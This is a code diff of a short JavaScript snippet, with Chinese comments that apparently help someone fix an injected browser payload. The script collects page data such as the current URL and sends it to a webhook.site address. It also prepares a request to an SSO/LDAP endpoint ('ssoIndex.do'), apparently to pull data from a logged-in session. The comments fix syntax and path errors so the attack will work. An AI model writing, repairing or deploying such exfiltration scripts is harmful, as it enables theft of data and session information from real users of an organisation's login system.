@@ -1,11 +1,6 @@
 (async () => {
     var webhook = "https://webhook.site/03cb0e83-4629-4064-855a-f7562f59068d";
     
-    // 修正1：使用絕對路徑 (加斜線開頭)，防止相對路徑解析錯誤
-
-	(async () => {
-    var webhook = "https://webhook.site/03cb0e83-4629-4064-855a-f7562f59068d";
-    
     // 收集環境資訊
     var debugInfo = {
         location: window.location.href,      // 當前頁面 URL
@@ -20,6 +15,14 @@
         mode: 'no-cors',
         body: JSON.stringify(debugInfo)
     });
+})();
+
+(async () => {
+    var webhook = "https://webhook.site/03cb0e83-4629-4064-855a-f7562f59068d";
+    
+    // 修正1：使用絕對路徑 (加斜線開頭)，防止相對路徑解析錯誤
+
+	
     // 注意：你原本的代碼這裡少了引號，這會導致語法錯誤，記得加上
     var ssoUrl = "/ssoIndex.do?apOu=GuidanceApp_LDAP&datetime1=" + Date.now();
 
